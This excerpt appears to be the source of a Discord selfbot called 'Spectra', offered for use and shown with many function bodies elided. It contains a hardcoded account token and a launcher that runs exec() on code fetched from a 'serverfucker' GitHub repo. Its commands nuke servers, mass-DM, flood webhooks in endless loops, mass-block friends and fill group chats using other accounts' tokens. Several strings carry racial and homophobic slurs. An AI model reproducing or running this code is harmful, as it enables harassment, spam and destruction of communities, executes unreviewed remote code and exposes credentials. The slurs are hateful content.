...
TOKEN = "MTM1NzA4MjAxMzEyMjY5MTE3NQ.GyWcam.SUt1M1SJKPDvp5iJEBo0YmQ4U7Ce8S0eKzmsAI"
...
def show_update_popup():
    ...
    message = (
        ...
        "[ENG] New Update is Out Now. Would you like to Download?\n"

        "[RO] Nou Update este Disponibilă acum. Doresti să descărcați?"

    )

    return ctypes.windll.user32.MessageBoxW(0, message, "Spectra", 4)



def download_update():

    print(f"{hex_to_ansi('#ffe294')}[+] Version Checking...{Style.RESET_ALL}")

    time.sleep(2)

    print(f"{hex_to_ansi('#94fffb')}[+] Downloading Updates...{Style.RESET_ALL}")

    time.sleep(2)

    try:

        raw_url = "https://raw.githubusercontent.com/cgtu/spectra-updates/main/selfbot_wild.py"

        response = requests.get(raw_url)

        response.raise_for_status()

        with open("selfbot_wild.py", "w", encoding="utf-8") as f:

            f.write(response.text)

        print(f"{Fore.GREEN}[+] Update complete! Please restart the bot.{Style.RESET_ALL}")
...
def check_for_updates():
    ...
    try:
        ...
        version_url = "https://raw.githubusercontent.com/cgtu/spectra-updates/main/version.txt"

        latest_version = requests.get(version_url).text.strip()

        if latest_version != __version__:

            response = show_update_popup()
            ...
            if response == 6:
                ...
                print(f"{Fore.YELLOW}[!] Skipped update.{Style.RESET_ALL}")

                if random.randint(1, 5) == 3:

                    print(f"{Fore.CYAN}[*] Re-checking for updates...{Style.RESET_ALL}")

                    time.sleep(1)

                    if show_update_popup() == 6:
        ...
        print(f"{Fore.RED}[-] Failed to check for updates: {e}{Style.RESET_ALL}")
...
ascii_art = f"""{Fore.MAGENTA}
   ...
   .dMMMb  dMMMMb  dMMMMMP .aMMMb dMMMMMMP dMMMMb  .aMMMb 

  dMP" VP dMP.dMP dMP     dMP"VMP   dMP   dMP.dMP dMP"dMP 

  VMMMb  dMMMMP" dMMMP   dMP       dMP   dMMMMK" dMMMMMP  

dP .dMP dMP     dMP     dMP.aMP   dMP   dMP"AMF dMP dMP   

VMMMP" dMP     dMMMMMP  VMMMP"   dMP   dMP dMP dMP dMP 
...
print(f"{Fore.MAGENTA}[+] Creator : {Style.RESET_ALL} @mbwv")
...
print(f"{Fore.MAGENTA}[+] Discord Server Nuker by Spectra. Press 1 to Launch : {Style.RESET_ALL}", end="")

if input() == "1":

        os.system("cls" if os.name == "nt" else "clear")

        exec(requests.get("https://raw.githubusercontent.com/cgtu/serverfucker/main/serverfucker.py").text)
...
async def mock(ctx, user: discord.User):
    ...
    await ctx.send(f" :  is now mocking {user.name}...")
...
async def thrax(ctx, user: discord.User):
    ...
    try:
        ...
        await ctx.send(f"error in  : spectra {e}")
...
async def packend(ctx):
    ...
    await ctx.send(" :  has now stopped packing.")
...
async def autopack(ctx, user: discord.User):
    ...
    await ctx.send(f" :  selfbot auto pack :3 {user.name}...")
...
async def playing(ctx, *, text):
    ...
    await ctx.send(f" :  set  status to playing heh **{text}**")
...
async def stream(ctx, *, text):
    ...
    await ctx.send(f" :  set stauts to streaming heh **{text}**")
...
async def listening(ctx, *, text):
    ...
    await ctx.send(f" :  status set to: listening to **{text}**")
...
async def statusstop(ctx):
    ...
    if status_task:
        ...
        await ctx.send(" :  SELFBOT status cycling is now off")

    else:

        await ctx.send(" :  SELFBOT no status cycling running.")
...
async def fakegame(ctx, *, text):
    ...
    await ctx.send(f" :  SELFBOT Fake game status set: **{text}**")
...
async def richstatus(ctx):
    ...
    await ctx.send(" :  SELFBOT Rich Presence coming soon. (Do stream or customstatus etc to get an rpc.)")
...
async def dm(ctx, *, msg):
    ...
    await ctx.send("``` :  mass dm, dming all your friends (if you get phone locked dont blame me this can get you limited)```")
    ...
    try:
        ...
        await ctx.send(f"``` :  mass has been done\nSent: {total_sent}\nFailed: {failed_sent}```")
...
async def addall(ctx):
    ...
    await ctx.send("WIP (coming soon to  :  im lazy and its hard) — Add friend IDs from file soon.")
...
async def removeall(ctx):
    ...
    await ctx.send(" :  is now removing all your nonexisting friends...")
    ...
    try:
        ...
        await ctx.send(" :  selfbot unfriended all.")
...
async def autoreply(ctx, user: discord.User, *, msg="Hello."):
    ...
    await ctx.send(f" :  autoreplying to {user.name} with: `{msg}`")
...
async def autoreact(ctx, user: discord.User, emoji):
    ...
    await ctx.send(f" :  is now reacting to {user.name} with {emoji}")
...
async def reactstop(ctx):
    ...
    await ctx.send(" :  auto react is now off.")
...
async def dmlog(ctx):
    ...
    await ctx.send(" :   WIP — future logging to file.")
...
async def massblock(ctx):
    ...
    await ctx.send(" :  blocking all of your friends CLOSE THE BOT IF U WANNA CANCEL THIS...")
    ...
    try:
        ...
        await ctx.send(" :  You Blocked all friends (time to get off discord and actually do something cool).")
...
async def gcfill(ctx):
    ...
    await ctx.send(f" :  tried adding {added}/{len(tokens[:12])} users to the group.")
    ...
    async def change_name(token):
        ...
        while protection_running:
            ...
            try:
                ...
                print(f"[!] error please contact alex: ({token[-4:]}): {e}")
...
async def gckick(ctx, user: discord.User):
    ...
    try:
        ...
        await ctx.send(f"spectra has now kicked {user.name} from group.")
...
async def antiraid(ctx):
    ...
    await ctx.send("spectra anti raid is now on slow mode for 30 seconds")
...
async def ping(ctx):
    ...
    await ctx.send(f"spectra selfbot ping: `{round(latency * 1000)}ms`")
...
async def uptime(ctx):
    ...
    await ctx.send(f"spectra uptime: `{days}d {hours}h {minutes}m {seconds}s`")
...
async def restart(ctx):
    ...
    await ctx.send("spectra is now restarting...")
...
async def snipe(ctx):
    ...
    await ctx.send("im cumming to alex")
...
async def editsnipe(ctx):
    ...
    await ctx.send("im cumming to alex") ### whenever i feel like it i'll add it to this. ###
...
async def rickroll(ctx, user: discord.User):
    ...
    await ctx.send(f"{user.mention} yes im corny asf but check ts out https://discord.com/users/1357082013122691175")
...
async def whspam(ctx, url, *, msg):
    ...
    await ctx.send(f" :  is now spamming the webhook with: `{msg}`")
    ...
    try:
        ...
        await ctx.send(" :  webhook spam done xd.")
...
async def whnuke(ctx, url, *, msg):
    ...
    await ctx.send(f" :  is now nuking the webhook with `{msg}`shoutout alex heh...")
    ...
    try:
        ...
        while True:
            ...
            async with aiohttp.ClientSession() as session:
                ...
                await session.post(url, json={"content": " :  runs me!! 💦"})
...
async def whrainbow(ctx, url):
    ...
    try:
        ...
        await ctx.send(" :  you are now a true faggot.")
    ...
    try:
        ...
        async with aiohttp.ClientSession() as session:
            ...
            if response.status == 204:
                ...
                await ctx.send(" :  ghost pinged webhook.")
...
async def whupload(ctx, url):
    ...
    try:
        ...
        await ctx.send(" :  has sent the files.")
...
async def setbanner(ctx, url):
    ...
    await ctx.send(" :  setting banner is locked to Nitro Boost :3—  WIP")
...
async def cloneme(ctx):
    ...
    await ctx.send(" :  note from alex: cloning not added yet sorry guys — WIP")
...
async def massleave(ctx):
    ...
    try:
        ...
        await ctx.send(" :  has left all servers ^_^.")
...
async def massdm(ctx, *, msg):
    ...
    await ctx.send(" :  is now dming everyone from all servers but this can get you rate limited or even account locked...")
    ...
    try:
        ...
        await ctx.send(f" :  has dmed {sent} users.")
...
async def massreact(ctx, emoji):
    ...
    await ctx.send(f" :  is now reacting to all messages with {emoji} :3")
    ...
    await ctx.send(" :  reactions are now done.")
...
async def stealemoji(ctx, url):
    ...
    try:
        ...
        await ctx.send(f" :  has now stolen the emoji: <:{emoji.name}:{emoji.id}>")
...
async def nuke(ctx):
    ...
    await ctx.send(" :  is now nuking this server...")
    ...
    try:
        ...
        for i in range(10):
            ...
            await ctx.guild.create_text_channel(f" : -selfbot-{random.randint(100,999)}")

        await ctx.send(" :  nuke finished.")
...
async def spamchannels(ctx, *, name="alex-runs-you"):

    await ctx.send(f" :  is now spamming channels with name: `{name}`")
...
async def spamroles(ctx, *, name="alex runs you"):
...
async def dmall(ctx, *, msg):
    ...
    await ctx.send(" :  is now dming everyone in the server WARNING: THIS CAN GET YOUR ACCOUNT LOCKED")
...
async def animstatus(ctx):
    ...
    statuses = [" :  selfbot", "project  : ", "DONT RUN DONT RUN DONT RUN", "i  :  you."]
...
async def aiquote(ctx):
    ...
    quotes = [
        ...
        " :  is the greatest selfbot of all time and i look up to alex.",
...
async def nickgpt(ctx):
    ...
    names = ["alex", "CurryMuncher", "Nigger", "Jamal", "BootyLover456"]
...
async def react(ctx, user: discord.User, *emojis):
    ...
    await ctx.send(f"Started reacting to {user.mention} with {emojilist}")  
...
async def menu(ctx):
 ...
 ______   ______   ______   ______  _________  ______    ________      

/_____/\ /_____/\ /_____/\ /_____/\/________/\/_____/\  /_______/\     
...
\::::_\/_\:::_ \ \\::::_\/_\:::__\/\__.::.__\/\:::_ \ \ \::: _  \ \    
 ...
 \:\/___/\\:(_) \ \\:\/___/\\:\ \  __ \::\ \   \:(_) ) )_\::(_)  \ \   
  ...
  \_::._\:\\: ___\/ \::___\/_\:\ \/_/\ \::\ \   \: __ `\ \\:: __  \ \  
    ...
    \_____\/ \_\/     \_____\/ \_____\/  \__\/    \_\/ \_\/ \__\/\__\/ 
